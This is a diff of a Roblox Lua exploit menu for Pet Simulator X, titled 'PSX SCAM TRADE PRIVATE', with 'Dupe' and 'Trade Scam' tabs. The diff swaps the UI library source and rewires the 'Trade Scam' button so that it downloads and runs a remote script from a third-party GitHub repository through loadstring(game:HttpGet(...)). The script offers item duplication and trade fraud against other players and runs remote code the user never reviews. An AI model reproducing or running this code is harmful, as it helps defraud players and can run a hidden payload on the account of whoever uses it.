@@ -1,8 +1,7 @@
-if game.PlaceId == 6284583030 then
-    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Maset0/PSX/main/GUI.lua')))()
-    local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE 3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
-    
-    local Tab = Window:MakeTab({
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE V3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
         Name = "Info",
         Icon = "rbxassetid://4483345998",
         PremiumOnly = false
@@ -20,9 +19,8 @@ if game.PlaceId == 6284583030 then
         PremiumOnly = false
     })
     
-    
     Tab:AddLabel("DUPE STATUS:WORKING")
-
+    
     local Section = Tab:AddSection({
         Name = "Dupe Section"
     })
@@ -32,9 +30,9 @@ if game.PlaceId == 6284583030 then
         Callback = function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
           end    
-    })    
+    })
     
-    Tab:AddTextbox({
+     Tab:AddTextbox({
         Name = "Rename all pets",
         Default = "Text Goes here",
         TextDisappear = true,
@@ -43,7 +41,6 @@ if game.PlaceId == 6284583030 then
         end	  
     })
     
-
     local Tab = Window:MakeTab({
         Name = "Trade Scam",
         Icon = "rbxassetid://4483345998",
@@ -56,11 +53,11 @@ if game.PlaceId == 6284583030 then
 	Name = "Trade Scam Section"
     })
 
-    Tab:AddToggle({
+    Tab:AddButton({
         Name = "Trade Scam",
         Default = false,
         Callback = function(Value)
-            print(Value)
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
         end    
     })
 
@@ -70,18 +67,6 @@ if game.PlaceId == 6284583030 then
         print(Value)
   	end    
     })
+    
+    
 
-
-
-
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    end
-    OrionLib:Init()
